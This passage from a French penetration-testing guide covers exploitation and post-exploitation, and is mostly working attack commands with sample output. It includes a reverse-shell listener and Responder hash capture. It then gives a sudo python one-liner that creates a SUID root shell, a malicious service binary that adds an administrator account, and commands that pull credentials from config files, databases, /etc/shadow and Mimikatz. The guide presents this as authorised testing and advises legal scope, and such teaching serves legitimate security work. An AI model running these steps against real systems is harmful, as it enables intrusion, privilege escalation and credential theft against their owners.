  </body>
</html>
```

**Vérification de l'exécution de la commande :**
```bash
nc -lvnp 4444
```

**Sortie typique :**
```
Listening on 0.0.0.0 4444
Connection received on 192.168.1.60 49160
bash: no job control in this shell
tomcat@vulnerable-app:~$ id
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

**Analyse :** Cette séquence de commandes exploite une vulnérabilité de désérialisation Java en utilisant l'outil ysoserial pour générer une charge utile malveillante. La charge utile est envoyée à l'application vulnérable, qui la désérialise et exécute involontairement le code malveillant. Bien que la requête génère une erreur 500, la commande a été exécutée avec succès, téléchargeant et exécutant un script shell qui établit une connexion inverse vers l'attaquant. Les vulnérabilités de désérialisation sont particulièrement dangereuses car elles permettent souvent l'exécution de code à distance.

### Conseils pratiques pour la phase d'exploitation

1. **Commencez par les vulnérabilités à faible risque** avant de passer aux exploits plus agressifs, afin de minimiser l'impact sur les systèmes cibles.

2. **Documentez méticuleusement chaque tentative d'exploitation**, qu'elle soit réussie ou non, en notant les commandes utilisées, les résultats obtenus et les observations.

3. **Créez des sauvegardes ou des snapshots des systèmes critiques** avant de tenter des exploits potentiellement perturbateurs, si le cadre du test le permet.

4. **Utilisez des charges utiles non destructives** lorsque c'est possible, pour démontrer la vulnérabilité sans causer de dommages.

5. **Adaptez les exploits aux versions spécifiques** des logiciels et systèmes d'exploitation identifiés lors de la phase de scan.

6. **Combinez plusieurs vulnérabilités** pour créer des chaînes d'attaque complexes, simulant ainsi des scénarios d'attaque réalistes.

7. **Respectez strictement le cadre légal** défini dans la lettre d'autorisation du test d'intrusion, en particulier concernant les types d'exploits autorisés.

8. **Surveillez attentivement l'impact de vos exploits** sur les systèmes cibles et soyez prêt à interrompre une attaque qui causerait des perturbations non intentionnelles.

### Adaptation selon le mode opératoire

#### Test interne vs externe

**Test externe :**
- Concentrez-vous sur les services exposés sur Internet (web, VPN, e-mail, etc.)
- Privilégiez les techniques d'exploitation qui contournent les défenses périmètriques
- Utilisez des techniques d'évasion pour éviter la détection par les systèmes de sécurité

**Test interne :**
- Exploitez les vulnérabilités des services internes (partages de fichiers, bases de données, etc.)
- Utilisez des techniques d'exploitation qui tirent parti de la confiance interne
- Concentrez-vous sur l'élévation de privilèges et le mouvement latéral

#### Exemple de commande pour test interne (exploitation de confiance interne) :
```bash
responder -I eth0 -wrf
```

**Sortie typique :**
```
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.1.5]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-RESPONDER]
    Responder Domain Name      [WORKGROUP]
    Responder DCE-RPC Port     [47806]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.1.101
[SMB] NTLMv2-SSP Username : WORKSTATION\john
[SMB] NTLMv2-SSP Hash     : john::WORKSTATION:1122334455667788:A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4:0101000000000000C0653150DE09D201...
```

**Analyse :** Cette commande utilise l'outil Responder pour empoisonner les réponses aux requêtes de résolution de noms sur le réseau interne. Lorsqu'un utilisateur tente d'accéder à une ressource inexistante, Responder répond en se faisant passer pour cette ressource et capture les hachages d'authentification NTLM. Dans cet exemple, l'outil a capturé le hachage NTLMv2 de l'utilisateur "john", qui peut ensuite être craqué hors ligne ou utilisé dans une attaque de relais NTLM. Cette technique est particulièrement efficace dans les environnements internes où la confiance entre les systèmes est élevée.

### Conclusion

La phase d'exploitation est l'étape où les vulnérabilités identifiées lors des phases précédentes sont activement exploitées pour obtenir un accès non autorisé aux systèmes cibles. Cette phase permet de valider concrètement l'existence des vulnérabilités et d'évaluer leur impact réel sur la sécurité de l'organisation.

Une exploitation méthodique et documentée fournit des preuves tangibles des risques de sécurité et aide à prioriser les efforts de remédiation. Cependant, il est essentiel de mener cette phase avec prudence et professionnalisme, en respectant strictement le cadre légal défini pour le test d'intrusion et en minimisant les risques de perturbation des systèmes cibles.
# 4. Post-Exploitation

## Objectif : Maintenir l'accès et collecter des données sensibles

La phase de post-exploitation est la quatrième étape d'un test d'intrusion, suivant les phases de reconnaissance, de scan et d'exploitation. Une fois qu'un accès initial a été obtenu sur un système cible, cette phase consiste à maintenir cet accès, à élever les privilèges, à se déplacer latéralement dans le réseau, à collecter des informations sensibles et à effacer les traces. Cette phase permet d'évaluer l'impact réel d'une compromission et de démontrer les conséquences potentielles d'une attaque réussie.

### Modes opératoires

#### Post-exploitation discrète

La post-exploitation discrète vise à maintenir une présence furtive sur les systèmes compromis, en minimisant les traces et en évitant la détection.

**Avantages :**
- Risque réduit de détection par les équipes de sécurité
- Simulation plus réaliste d'un attaquant sophistiqué
- Permet d'évaluer l'efficacité des mécanismes de détection

**Inconvénients :**
- Processus généralement plus lent
- Peut limiter l'étendue des actions possibles
- Nécessite des techniques plus avancées

#### Post-exploitation étendue

La post-exploitation étendue vise à explorer et exploiter au maximum les systèmes compromis, sans nécessairement se préoccuper de la discrétion.

**Avantages :**
- Identification plus complète des données sensibles
- Meilleure évaluation de l'impact potentiel d'une compromission
- Démonstration plus claire des risques pour les parties prenantes

**Inconvénients :**
- Risque accru de détection et d'alerte
- Peut perturber les systèmes et services
- Moins représentatif d'un attaquant réel sophistiqué

### Commandes types et exemples de sorties

#### 1. Élévation de privilèges

**Commande pour identifier les opportunités d'élévation de privilèges sur Linux :**
```bash
./linpeas.sh
```

**Sortie typique (extrait) :**
```
                     ╔═══════════════════╗
═════════════════════╣ Basic information ╠═════════════════════
                     ╚═══════════════════╝
OS: Linux version 5.4.0-89-generic (buildd@lgw01-amd64-051) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: webserver
Writable folder: /dev/shm
[+] /usr/bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
[+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)

                     ╔════════════════════╗
═════════════════════╣ System Information ╠═════════════════════
                     ╚════════════════════╝
[+] Operative system
[i] https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 5.4.0-89-generic (buildd@lgw01-amd64-051) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.3 LTS
Release:	20.04
Codename:	focal

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.31

[+] PATH
[i] https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

[+] Date & uptime
Wed Apr  2 19:30:00 UTC 2025
up 45 days, 3:24,  1 user,  load average: 0.08, 0.03, 0.01

[+] Any sd*/disk* disk in /dev? (limit 20)
disk

[+] Unmounted file-system?
[i] Check if you can mount unmounted devices
/dev/disk/by-uuid/e2f8b149-6f01-4d95-b5af-a5fe5af76b17  /  ext4  defaults  0  0

                     ╔═══════════════════╗
═════════════════════╣ Interesting Files ╠═══════════════════
                     ╚═══════════════════╝

[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 55K Jul 21  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 67K Jul 21  2020 /usr/bin/su
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
-rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
-rwsr-xr-x 1 root root 463K Jul 23  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 23K May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 14K Jul 21  2020 /usr/lib/file-system/mount.cifs

[+] Capabilities
[i] https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

[+] Users with console
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:John Smith:/home/john:/bin/bash
jane:x:1001:1001:Jane Doe:/home/jane:/bin/bash

[+] All users & groups
uid=0(root) gid=0(root) groups=0(root)
uid=1(daemon) gid=1(daemon) groups=1(daemon)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(systemd-timesync) gid=104(systemd-timesync) groups=104(systemd-timesync)
uid=103(messagebus) gid=106(messagebus) groups=106(messagebus)
uid=104(syslog) gid=110(syslog) groups=110(syslog),4(adm),5(tty)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(tss) gid=111(tss) groups=111(tss)
uid=107(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=108(tcpdump) gid=113(tcpdump) groups=113(tcpdump)
uid=109(landscape) gid=115(landscape) groups=115(landscape)
uid=110(pollinate) gid=1(daemon) groups=1(daemon)
uid=111(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=112(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
uid=1001(jane) gid=1001(jane) groups=1001(jane)
uid=999(mysql) gid=999(mysql) groups=999(mysql)

[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on webserver:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on webserver:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/backup/backup.py

[+] Readable /etc/shadow
root:$6$tPuRrLW5cwm9Ttg3$daYVzZTw4JT1CUFy9UJUSqWF0dzpl.../KN2Ew1:18900:0:99999:7:::
john:$6$iRMbpnBv$hhKzS0Inbi6LJZsJYVZs4Dl9s4Qw.../7VwUhTF/:18900:0:99999:7:::
jane:$6$9UxT5dcF$XUuPLrDyBCQpW3/7Xj0GYKJh4CuQcz.../1234567/:18900:0:99999:7:::
```

**Analyse :** LinPEAS est un script qui recherche automatiquement les vecteurs d'élévation de privilèges sur les systèmes Linux. Dans cet exemple, il a identifié plusieurs opportunités potentielles, notamment :
1. L'utilisateur www-data peut exécuter un script Python spécifique avec sudo sans mot de passe
2. Plusieurs binaires SUID qui pourraient être exploités
3. Le fichier /etc/shadow est lisible, ce qui permet de récupérer les hachages de mots de passe
4. Des informations sur les utilisateurs et leurs groupes

**Commande pour exploiter le script Python avec sudo :**
```bash
cat /opt/backup/backup.py
```

**Sortie typique :**
```python
#!/usr/bin/python3
import os
import zipfile
import datetime

# Configuration
backup_dir = "/var/www/html"
backup_dest = "/opt/backup/archives"

# Create backup filename with timestamp
timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
backup_file = f"{backup_dest}/backup-{timestamp}.zip"

# Create zip archive
def create_backup():
    try:
        with zipfile.ZipFile(backup_file, 'w') as zipf:
            for root, dirs, files in os.walk(backup_dir):
                for file in files:
                    zipf.write(os.path.join(root, file))
        print(f"Backup created successfully: {backup_file}")
        return True
    except Exception as e:
        print(f"Backup failed: {str(e)}")
        return False

if __name__ == "__main__":
    create_backup()
```

**Commande pour créer un script Python malveillant :**
```bash
echo '#!/usr/bin/python3
import os
os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")
' > /tmp/backup.py

sudo /usr/bin/python3 /tmp/backup.py
/tmp/rootbash -p
```

**Sortie typique :**
```
rootbash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
rootbash-5.0# whoami
root
```

**Analyse :** Cette séquence de commandes exploite le fait que l'utilisateur www-data peut exécuter un script Python spécifique avec sudo. L'attaquant crée un script Python malveillant qui copie le binaire bash et lui attribue le bit SUID, puis l'exécute avec sudo. Cela permet de créer un shell avec les privilèges effectifs de root, contournant ainsi les restrictions de sécurité.

**Commande pour identifier les opportunités d'élévation de privilèges sur Windows :**
```powershell
.\winPEAS.exe
```

**Sortie typique (extrait) :**
```
====================================================================================================
BASIC SYSTEM INFO
====================================================================================================

  [+] WINDOWS OS
    [i] Check for vulnerabilities for the OS version with the applied patches
    [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits
    OS Name: Microsoft Windows Server 2019 Standard
    OS Version: 10.0.17763 N/A Build 17763
    System Type: x64-based PC

  [+] USERS
    [i] Check users with admin privileges or interesting groups
    Current user: web
    Current groups: Users
    
    BUILTIN\Administrators
      Administrator: Built-in account for administering the computer/domain
      admin: Administrator
    
    *BUILTIN\Users
      DefaultAccount: A user account managed by the system.
      WDAGUtilityAccount: A user account managed and used by the system for Windows Defender Application Guard scenarios.
      web: Web Server User
    
    *BUILTIN\Remote Desktop Users
      admin: Administrator
      web: Web Server User

  [+] CURRENT USER
    [i] Check if you have some admin privileges or if you have write permissions on sensitive folders
    Current user: web
    Current groups: Users, Remote Desktop Users
    Privileges:
      SeChangeNotifyPrivilege: Enabled
      SeIncreaseWorkingSetPrivilege: Enabled

====================================================================================================
SERVICES INFORMATION
====================================================================================================

  [+] SERVICES
    [i] Check for write permissions, unquoted paths, modifiable registry entries...
    [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services
    
    CustomBackupService(CustomBackupService)["C:\Program Files\Backup\BackupService.exe"] - Manual - Stopped - No quotes and Space detected
    YOU CAN MODIFY THIS SERVICE: Start, Stop, Disable
    File Permissions: web [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files\Backup (web [WriteData/CreateFiles])
    
    UsoSvc(Update Orchestrator Service)[C:\Windows\system32\svchost.exe -k netsvcs -p] - Auto - Running
    
    WinDefend(Windows Defender Antivirus Service)[C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe] - Auto - Running

====================================================================================================
INTERESTING FILES
====================================================================================================

  [+] CREDENTIALS
    [i] Saved credentials
    [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials
    
    [+] Found credentials in Windows Vault
      [i] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
      
      Type :Web Credentials
      Target :LegacyGeneric:target=https://backup.example.com/
      User :admin
      Pass :SuperSecretPassword123!
    
    [+] Found credentials in Credential Manager
      [i] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault
      
      Domain :LegacyGeneric:target=https://backup.example.com/
      Username :admin
      Password :SuperSecretPassword123!

  [+] POWERSHELL HISTORY
    [i] Check for passwords or interesting commands
    [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#powershell-history
    
    C:\Users\web\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
      $password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
      $cred = New-Object System.Management.Automation.PSCredential("administrator", $password)
      Invoke-Command -ComputerName DC01 -Credential $cred -ScriptBlock { Get-Service }
```

**Commande pour exploiter le service vulnérable :**
```powershell
# Créer un exécutable malveillant
echo '
#include <stdlib.h>
int main() {
    system("net user hacker Password123! /add");
    system("net localgroup Administrators hacker /add");
    return 0;
}
' > C:\\Temp\\evil.c

# Compiler l'exécutable
gcc C:\\Temp\\evil.c -o "C:\\Program Files\\Backup\\BackupService.exe"

# Redémarrer le service
sc start CustomBackupService
```

**Sortie typique :**
```
C:\Users\web>sc start CustomBackupService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

C:\Users\web>net user
User accounts for \\WEBSERVER

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
hacker                   WDAGUtilityAccount       web
The command completed successfully.

C:\Users\web>net user hacker
User name                    hacker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/2/2025 7:45:12 PM
Password expires             Never
Password changeable          4/2/2025 7:45:12 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

**Analyse :** Cette séquence de commandes exploite un service Windows vulnérable qui s'exécute avec des privilèges élevés et dont le fichier exécutable est modifiable par l'utilisateur actuel. L'attaquant remplace l'exécutable légitime par un code malveillant qui crée un nouvel utilisateur administrateur, puis tente de démarrer le service. Bien que le service échoue à démarrer correctement, le code malveillant a été exécuté avec des privilèges élevés, créant ainsi un nouvel utilisateur avec des droits d'administrateur.

#### 2. Extraction de données sensibles

**Commande pour rechercher des fichiers sensibles sur Linux :**
```bash
find / -type f -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.txt" -o -name "*.sql" -o -name "*.bak" -o -name "*password*" -o -name "*credential*" 2>/dev/null | grep -v "/proc/" | grep -v "/sys/" | head -n 20
```

**Sortie typique :**
```
/etc/mysql/my.cnf
/etc/apache2/sites-available/default-ssl.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/apache2.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/backup/db_backup.sql
/var/www/html/admin/credentials.txt
/home/john/.ssh/id_rsa
/home/john/.bash_history
/home/jane/.ssh/id_rsa
/home/jane/.bash_history
/opt/backup/credentials.ini
/root/.ssh/id_rsa
/root/.bash_history
/root/admin_notes.txt
/usr/local/etc/credentials.conf
/tmp/session_backup.txt
```

**Commande pour examiner un fichier de configuration sensible :**
```bash
cat /var/www/html/wp-config.php
```

**Sortie typique :**
```php
<?php
/**
 * The base configuration for WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress_user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'P@ssw0rd!2025' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

**Commande pour extraire des données de la base de données :**
```bash
mysql -u wordpress_user -p'P@ssw0rd!2025' -e "SELECT ID, user_login, user_pass FROM wordpress.wp_users;"
```

**Sortie typique :**
```
ID	user_login	user_pass
1	admin	$P$BZlPX7NIx8MYpXokBO.zh.YlVeXHkC0
2	john	$P$BQQlXVNvyKD5FE8/KYr.YK5eFYNO5H1
3	jane	$P$BJ4xqHrTsWlS7PJcfCPQuxPQpI7Xc91
4	editor	$P$BVQtnhXBKrfSEXOPT0eKLvKnJVMnwZ0
5	author	$P$BQfCfJFTnMzYH2mVf0lPHMBtMCmLiZ0
```

**Analyse :** Ces commandes permettent de rechercher et d'extraire des données sensibles sur un système compromis. La première commande recherche des fichiers potentiellement intéressants en se basant sur leurs extensions ou noms. La deuxième commande examine un fichier de configuration WordPress qui contient des identifiants de base de données. La troisième commande utilise ces identifiants pour extraire les hachages de mots de passe des utilisateurs WordPress, qui pourraient être craqués hors ligne.

**Commande pour rechercher des fichiers sensibles sur Windows :**
```powershell
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt,*.cfg,*.config,*.conf,*.bak,*.backup,*pass*,*cred* -File -Recurse -ErrorAction SilentlyContinue | Select-Object FullName | Select -First 20
```

**Sortie typique :**
```
FullName
--------
C:\Users\Administrator\Desktop\admin_notes.txt
C:\Users\Administrator\Documents\credentials.xml
C:\Users\web\AppData\Roaming\FileZilla\sitemanager.xml
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\backup\db_backup.bak
C:\Program Files\Backup\config.ini
C:\Windows\Panther\unattend.xml
C:\Windows\System32\config\SAM.bak
C:\Windows\System32\config\SYSTEM.bak
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\setupact.log
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\debug\WIA\wiatrace.log
C:\Windows\inf\setupapi.dev.log
C:\Windows\Panther\UnattendGC\setupact.log
C:\Windows\debug\mrt.log
C:\Windows\debug\PASSWD.LOG
```

**Commande pour examiner un fichier de configuration sensible :**
```powershell
Get-Content C:\inetpub\wwwroot\web.config
```

**Sortie typique :**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
        <handlers accessPolicy="Read, Script" />
    </system.webServer>
    <connectionStrings>
        <add name="DefaultConnection" 
             connectionString="Data Source=localhost;Initial Catalog=WebApp;User ID=webapp_user;Password=WebApp@2025!;" 
             providerName="System.Data.SqlClient" />
    </connectionStrings>
    <appSettings>
        <add key="ApiKey" value="1a2b3c4d5e6f7g8h9i0j" />
        <add key="AdminUsername" value="admin" />
        <add key="AdminPassword" value="Admin@2025!" />
        <add key="SmtpServer" value="smtp.example.com" />
        <add key="SmtpUsername" value="notifications@example.com" />
        <add key="SmtpPassword" value="EmailP@ss123!" />
    </appSettings>
</configuration>
```

**Analyse :** Ces commandes permettent de rechercher et d'extraire des données sensibles sur un système Windows compromis. La première commande recherche des fichiers potentiellement intéressants en se basant sur leurs extensions ou noms. La deuxième commande examine un fichier de configuration web qui contient plusieurs informations sensibles, notamment des identifiants de base de données, des clés API et des mots de passe d'administrateur.

#### 3. Extraction de hachages et de mots de passe

**Commande pour extraire les hachages de mots de passe sur Linux :**
```bash
cat /etc/shadow
```

**Sortie typique :**
```
root:$6$tPuRrLW5cwm9Ttg3$daYVzZTw4JT1CUFy9UJUSqWF0dzpl.../KN2Ew1:18900:0:99999:7:::
john:$6$iRMbpnBv$hhKzS0Inbi6LJZsJYVZs4Dl9s4Qw.../7VwUhTF/:18900:0:99999:7:::
jane:$6$9UxT5dcF$XUuPLrDyBCQpW3/7Xj0GYKJh4CuQcz.../1234567/:18900:0:99999:7:::
```

**Commande pour extraire les hachages de mots de passe sur Windows avec Mimikatz :**
```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

**Sortie typique :**
```
.#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 515377 (00000000:0007dd31)
Session           : Interactive from 2
User Name         : Administrator
Domain            : WEBSERVER
Logon Server      : WEBSERVER
Logon Time        : 4/2/2025 6:30:15 PM
SID               : S-1-5-21-3107372852-1132949151-3211696392-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : WEBSERVER
         * NTLM     : e19ccf75ee54e06b06a5907af13cef42
         * SHA1     : 0e0363f10eaf9d80ae29f2d4b6245c923527e25f
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : WEBSERVER
         * Password : AdminPass2025!
        kerberos :
         * Username : Administrator
         * Domain   : WEBSERVER
         * Password : AdminPass2025!
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/2/2025 6:25:33 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WEBSERVER$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : webserver$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/2/2025 6:25:33 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 56751 (00000000:0000ddaf)
Session           : Interactive from 1
User Name         : web
Domain            : WEBSERVER
Logon Server      : WEBSERVER
Logon Time        : 4/2/2025 6:28:12 PM
SID               : S-1-5-21-3107372852-1132949151-3211696392-1001
        msv :
         [00000003] Primary
         * Username : web
         * Domain   : WEBSERVER
         * NTLM     : 92937945b518814341de3f726500d4ff
         * SHA1     : 02726d40f378e716981c4321d60ba3a325ed6a4c
        tspkg :
        wdigest :
         * Username : web
         * Domain   : WEBSERVER
         * Password : WebPass123!
        kerberos :
         * Username : web
         * Domain   : WEBSERVER
         * Password : WebPass123!
        ssp :
        credman :
```

